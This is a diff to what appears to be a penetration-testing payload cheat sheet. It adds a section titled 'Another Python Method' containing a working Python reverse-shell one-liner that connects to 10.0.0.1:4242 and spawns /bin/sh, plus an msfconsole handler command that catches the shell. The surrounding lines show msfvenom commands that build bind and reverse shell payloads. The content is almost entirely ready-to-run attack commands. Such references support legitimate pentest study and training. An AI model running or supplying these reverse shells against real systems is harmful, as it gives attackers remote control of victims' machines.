@@ -159,6 +159,16 @@ msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<IP> LPORT=<PORT> -f elf > bind
 ```
 msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
 ```
+
+#### Another Python Method
+
+```
+python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+
+
+msfconsole -q -x "use multi/handler; set payload cmd/unix/reverse_python; set lhost 192.168.45.222; set lport 4444; exploit"
+```
+
 ### <ins>Web-Based Payloads</ins>
 
 #### **PHP**
